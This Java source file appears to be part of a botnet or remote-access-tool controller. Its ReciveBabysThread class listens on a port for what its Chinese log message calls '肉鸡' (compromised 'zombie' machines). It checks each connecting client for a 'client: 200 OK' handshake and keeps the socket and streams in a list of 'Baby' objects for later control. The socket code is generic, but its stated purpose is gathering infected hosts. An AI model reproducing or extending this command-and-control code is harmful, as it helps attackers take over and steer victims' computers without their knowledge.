package com.server;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class ReciveBabysThread extends Thread{

	private ArrayList<Baby> babys = new ArrayList<>();
	private int port;
	
	public ReciveBabysThread(int port) {
		// TODO Auto-generated constructor stub
		super();
		this.port = port;
	}
	
	public ArrayList<Baby> getBabys() {
		return babys;
	}


	public void run() {
		try {
			ServerSocket listenServer = new ServerSocket(port);
			System.out.println("正在" + port +"端口上监听肉鸡");
			while(true) {
				//将连接到服务器的客户端添加到babys
				Socket socket = listenServer.accept();
				BufferedReader reader = 
						new BufferedReader(new InputStreamReader(socket.getInputStream(),"utf-8"));
				BufferedWriter writer =
						new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(),"utf-8"));
				if(reader.readLine().equals("client: 200 OK")) {
					System.out.println(socket.getInetAddress() + "宝贝上线,已添加到队列。");
					Baby baby = new Baby(socket, reader, writer);
					babys.add(baby);
				}
			}
			
			
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	

}
